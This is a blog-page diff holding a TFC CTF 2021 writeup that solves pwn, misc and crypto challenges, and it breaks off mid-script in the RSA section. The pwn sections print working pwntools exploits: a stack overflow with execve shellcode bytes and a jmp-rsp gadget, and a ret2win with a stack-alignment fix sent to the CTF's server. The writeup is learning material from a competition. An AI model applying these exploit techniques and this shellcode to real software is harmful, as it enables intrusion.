@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>TFC CTF 2021 Writeup - R4v3N Blog</title><meta name="Description" content="This article provides answer keys to the TFC CTF 2021 challenges."><meta property="og:title" content="TFC CTF 2021 Writeup" />
+<meta property="og:description" content="This article provides answer keys to the TFC CTF 2021 challenges." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://w31rdr4v3n.github.io/tfcctf2021-writeup/" /><meta property="og:image" content="https://w31rdr4v3n.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-23T21:22:57+01:00" />
+<meta property="article:modified_time" content="2021-12-23T21:22:57+01:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://w31rdr4v3n.github.io/logo.png"/>
+
+<meta name="twitter:title" content="TFC CTF 2021 Writeup"/>
+<meta name="twitter:description" content="This article provides answer keys to the TFC CTF 2021 challenges."/>
+<meta name="application-name" content="_R4v3N">
+<meta name="apple-mobile-web-app-title" content="_R4v3N"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/R4v3N.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://w31rdr4v3n.github.io/tfcctf2021-writeup/" /><link rel="next" href="https://w31rdr4v3n.github.io/picoctf2022-writeup/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "TFC CTF 2021 Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/w31rdr4v3n.github.io\/tfcctf2021-writeup\/"
+        },"image": ["https:\/\/w31rdr4v3n.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "ctf, crypto, misc, pwn","wordcount":  715 ,
+        "url": "https:\/\/w31rdr4v3n.github.io\/tfcctf2021-writeup\/","datePublished": "2021-12-23T21:22:57+01:00","dateModified": "2021-12-23T21:22:57+01:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "_R4v3N","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/w31rdr4v3n.github.io\/images\/R4v3N.png",
+                    "width":  500 ,
+                    "height":  500 
+                }},"author": {
+                "@type": "Person",
+                "name": "_R4v3N"
+            },"description": "This article provides answer keys to the TFC CTF 2021 challenges."
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="R4v3N Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>_R4v3N</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="/events/"> Events </a><a class="menu-item" href="/about/"> About </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/tfcctf2021-writeup/" selected>English</option><option value="/fr/tfcctf2021-writeup/">Français</option></select>
+                    </a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="R4v3N Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>_R4v3N</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="/events/" title="">Events</a><a class="menu-item" href="/about/" title="">About</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/tfcctf2021-writeup/" selected>English</option><option value="/fr/tfcctf2021-writeup/">Français</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">TFC CTF 2021 Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>_R4v3N</a></span>&nbsp;<span class="post-category">included in <a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-12-23">2021-12-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;715 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;4 minutes&nbsp;<span id="/tfcctf2021-writeup/" class="leancloud_visitors" data-flag-title="TFC CTF 2021 Writeup">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="tfc.png"
+        data-srcset="/tfcctf2021-writeup/tfc.png, tfc.png 1.5x, /tfcctf2021-writeup/tfc.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/tfc.png"
+        title="This article provides answer keys to the TFC CTF 2021 challenges." /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#jumpy-pwn">Jumpy [Pwn]</a></li>
+    <li><a href="#secret-pwn">Secret [Pwn]</a></li>
+    <li><a href="#santa-pwn">Santa [Pwn]</a>
+      <ul>
+        <li>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#movaps-stack-alignment">Movaps stack alignment</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#weid-friend-misc">Weid friend [Misc]</a></li>
+    <li><a href="#am-i-doing-it-right-crypto">Am i doing it right? [Crypto]</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This article provides answer keys to the TFC CTF 2021 challenges.</p>
+<h2 id="jumpy-pwn">Jumpy [Pwn]</h2>
+<p>Attached file:<a href="/datas/jumpy" rel="">here</a></p>
+<p>Output of checksec</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ checksec jumpy
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/checkseckjumpy.png"
+        data-srcset="/tfcctf2021-writeup/datas/checkseckjumpy.png, datas/checkseckjumpy.png 1.5x, /tfcctf2021-writeup/datas/checkseckjumpy.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/checkseckjumpy.png"
+        title="Checksec" /></p>
+<p>The NX is disabled so we can run on the stack.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/ohjumpy.png"
+        data-srcset="/tfcctf2021-writeup/datas/ohjumpy.png, datas/ohjumpy.png 1.5x, /tfcctf2021-writeup/datas/ohjumpy.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/ohjumpy.png"
+        title="Exec" /></p>
+<p>Jumpy C code obtained by reverse engineering with ghidra.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/CJumpy.png"
+        data-srcset="/tfcctf2021-writeup/datas/CJumpy.png, datas/CJumpy.png 1.5x, /tfcctf2021-writeup/datas/CJumpy.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/CJumpy.png"
+        title="Cdecompile" /></p>
+<p>In the binary, there is no system function and no function to read the flag. As the stack is executable, we can push shellcode on it and execute it.</p>
+<p>First, we need to control the RIP.</p>
+<p>I have placed a breakpoint on the ret of the main function.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/disasmain.png"
+        data-srcset="/tfcctf2021-writeup/datas/disasmain.png, datas/disasmain.png 1.5x, /tfcctf2021-writeup/datas/disasmain.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/disasmain.png"
+        title="disasmain" />
+With 0x38 we can reach the RIP.</p>
+<p>For a test, I send this load: &ldquo;A &ldquo;*0x38 + &ldquo;BBBB&rdquo;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/jumpRIP.png"
+        data-srcset="/tfcctf2021-writeup/datas/jumpRIP.png, datas/jumpRIP.png 1.5x, /tfcctf2021-writeup/datas/jumpRIP.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/jumpRIP.png"
+        title="jumpRIP" />
+The RIP is well reached.</p>
+<p>We can now execute our shellcode on the stack.</p>
+<p>payload = &ldquo;A &ldquo;*0x38 + RSP_addr + shellcode</p>
+<p>We will push the shellcode on the RSP and call the RSP address in the RIP to be able to execute the shellcode.</p>
+<p>We don&rsquo;t have the address of the RSP but by doing a little research in the binary we have an instruction that makes a jump on the RSP, that will do the trick.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/jmprsp.png"
+        data-srcset="/tfcctf2021-writeup/datas/jmprsp.png, datas/jmprsp.png 1.5x, /tfcctf2021-writeup/datas/jmprsp.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/jmprsp.png"
+        title="jmprsp" /></p>
+<p>With the address of this instruction in the RIP, we can make a jump into the RSP and execute what is inside.</p>
+<p>payload = &ldquo;A&rdquo;*0x38 + p64(0x00401142) + shellcode</p>
+<p>Exploit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./jumpy&#34;</span><span class="p">)</span>
+<span class="c1">#sh = remote(&#34;34.65.228.239&#34;,1337)</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05</span><span class="s2">&#34;</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="mh">0x38</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401142</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Result:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/flag.png"
+        data-srcset="/tfcctf2021-writeup/datas/flag.png, datas/flag.png 1.5x, /tfcctf2021-writeup/datas/flag.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/flag.png"
+        title="Jumpyflag" /></p>
+<h2 id="secret-pwn">Secret [Pwn]</h2>
+<p>Attached file:<a href="/tfcctf2021-writeup/datas/secret" rel="">here</a></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/csecret.png"
+        data-srcset="/tfcctf2021-writeup/datas/csecret.png, datas/csecret.png 1.5x, /tfcctf2021-writeup/datas/csecret.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/csecret.png"
+        title="Cdecompile" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./secret&#34;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="mh">0xaabbccdd</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Result:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/outsecret.png"
+        data-srcset="/tfcctf2021-writeup/datas/outsecret.png, datas/outsecret.png 1.5x, /tfcctf2021-writeup/datas/outsecret.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/outsecret.png"
+        title="Secretflag" /></p>
+<h2 id="santa-pwn">Santa [Pwn]</h2>
+<p>Attached file:<a href="/tfcctf2021-writeup/datas/santa" rel="">here</a></p>
+<p>Output of checksec</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">$ checksec santa
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/checksecksanta.png"
+        data-srcset="/tfcctf2021-writeup/datas/checksecksanta.png, datas/checksecksanta.png 1.5x, /tfcctf2021-writeup/datas/checksecksanta.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/checksecksanta.png"
+        title="Checksec" /></p>
+<p>The NX is enabled, so we can&rsquo;t run anything on the stack, but off the stack.</p>
+<p>In this case, we will target the RSP.</p>
+<p>Let&rsquo;s run the binary.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/oh.png"
+        data-srcset="/tfcctf2021-writeup/datas/oh.png, datas/oh.png 1.5x, /tfcctf2021-writeup/datas/oh.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/oh.png"
+        title="Exec" /></p>
+<p>Santa&rsquo;s C code obtained by reverse engineering with ghidra.
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/CSanta.png"
+        data-srcset="/tfcctf2021-writeup/datas/CSanta.png, datas/CSanta.png 1.5x, /tfcctf2021-writeup/datas/CSanta.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/CSanta.png"
+        title="CSanta" /></p>
+<p>I found a flag function.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/flagsanta.png"
+        data-srcset="/tfcctf2021-writeup/datas/flagsanta.png, datas/flagsanta.png 1.5x, /tfcctf2021-writeup/datas/flagsanta.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/flagsanta.png"
+        title="flag()" /></p>
+<p>Here, we will have to cause a buffer overflow and execute the code of the flag function but not on the stack.</p>
+<p>To reach the RSP: &ldquo;A&rdquo; * 0x38 + &ldquo;BBBBBBBB&rdquo;
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/rspsanta.png"
+        data-srcset="/tfcctf2021-writeup/datas/rspsanta.png, datas/rspsanta.png 1.5x, /tfcctf2021-writeup/datas/rspsanta.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/rspsanta.png"
+        title="RSP" />
+We can see that the RSP is reached.</p>
+<p>We can now write our exploit to execute the flag function.</p>
+<p>Address of flag function : 0x00401152</p>
+<p>You can find it in gdb with the command :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh">info functions
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/flag_.png"
+        data-srcset="/tfcctf2021-writeup/datas/flag_.png, datas/flag_.png 1.5x, /tfcctf2021-writeup/datas/flag_.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/flag_.png"
+        title="flag" /></p>
+<p>Exploit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="c1">#sh = remote(&#34;server.challenge.ctf.thefewchosen.com&#34;,1340)</span>
+<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&#34;./santa&#34;</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401152</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Result:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/outsanta.png"
+        data-srcset="/tfcctf2021-writeup/datas/outsanta.png, datas/outsanta.png 1.5x, /tfcctf2021-writeup/datas/outsanta.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/outsanta.png"
+        title="Res" /></p>
+<p>But there is a problem.</p>
+<p>When I used it on the remote server, it did not work.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">[*] Got EOF while reading in interactive
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="movaps-stack-alignment">Movaps stack alignment</h5>
+<p>If you&rsquo;re segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system()<a href="https://ropemporium.com/guide.html" target="_blank" rel="noopener noreffer">Read more&hellip;</a></p>
+<p>The solution is to call the ret of the other address one more time before calling the flag() function when designing the overflow stack, so that the rsp address can be reduced by 8.</p>
+<p>I used the return address from init.
+To find it: objdump santa -M intel &ndash;disassemble=_init</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/initsanta.png"
+        data-srcset="/tfcctf2021-writeup/datas/initsanta.png, datas/initsanta.png 1.5x, /tfcctf2021-writeup/datas/initsanta.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/initsanta.png"
+        title="init" /></p>
+<p>New exploit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;server.challenge.ctf.thefewchosen.com&#34;</span><span class="p">,</span><span class="mi">1340</span><span class="p">)</span>
+<span class="c1">#sh = process(&#34;./santa&#34;)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x38</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401016</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00401152</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">())</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="weid-friend-misc">Weid friend [Misc]</h2>
+<p>Attached file:<a href="/tfcctf2021-writeup/datas/weird_friend.txt" rel="">here</a></p>
+<p>I use: <a href="https://github.com/waidotto/strong-qr-decoder" target="_blank" rel="noopener noreffer">strong-qr-decoder</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">c</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;weird_friend.txt&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+	<span class="n">flag</span><span class="p">,</span><span class="n">out</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;&#39;</span><span class="p">,</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">c</span><span class="p">:</span>
+		<span class="n">flag</span> <span class="o">+=</span> <span class="n">i</span>
+		<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span> <span class="o">==</span> <span class="mi">29</span><span class="p">:</span>
+			<span class="n">out</span> <span class="o">+=</span> <span class="n">flag</span><span class="o">+</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
+			<span class="n">flag</span><span class="o">=</span><span class="s2">&#34;&#34;</span>
+
+	<span class="nb">open</span><span class="p">(</span><span class="s2">&#34;qr.txt&#34;</span><span class="p">,</span><span class="s2">&#34;w&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Result:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/outqrd.png"
+        data-srcset="/tfcctf2021-writeup/datas/outqrd.png, datas/outqrd.png 1.5x, /tfcctf2021-writeup/datas/outqrd.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/outqrd.png"
+        title="Res" /></p>
+<h2 id="am-i-doing-it-right-crypto">Am i doing it right? [Crypto]</h2>
+<p>Attached file:<a href="/tfcctf2021-writeup/datas/AM_I_DOING_IT_RIGHT.zip" rel="">here</a></p>
+<p>Premierly, I wanted to use RSACTFTOOL to find D but it did not work.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/findD.png"
+        data-srcset="/tfcctf2021-writeup/datas/findD.png, datas/findD.png 1.5x, /tfcctf2021-writeup/datas/findD.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/findD.png"
+        title="D" /></p>
+<p>So I recover the N and the E with RSACTFTOOL.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/findne.png"
+        data-srcset="/tfcctf2021-writeup/datas/findne.png, datas/findne.png 1.5x, /tfcctf2021-writeup/datas/findne.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/findne.png"
+        title="NE" />
+I used some tools to retrieve the p, q and d but it does not work until i tried RSa-Cipher on <a href="https://www.dcode.fr/rsa-cipher" target="_blank" rel="noopener noreffer">Dcode</a></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/rsac0.png"
+        data-srcset="/tfcctf2021-writeup/datas/rsac0.png, datas/rsac0.png 1.5x, /tfcctf2021-writeup/datas/rsac0.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/rsac0.png"
+        title="Dcode" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/rsac1.png"
+        data-srcset="/tfcctf2021-writeup/datas/rsac1.png, datas/rsac1.png 1.5x, /tfcctf2021-writeup/datas/rsac1.png 2x"
+        data-sizes="auto"
+        alt="/tfcctf2021-writeup/datas/rsac1.png"
+        title="Dcode" /></p>
+<p>And bingo, I have the p, q and d.</p>
+<p>So I wrote a Python script to decrypted the chall.enc file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="n">long_to_bytes</span><span class="p">,</span><span class="n">bytes_to_long</span>
+
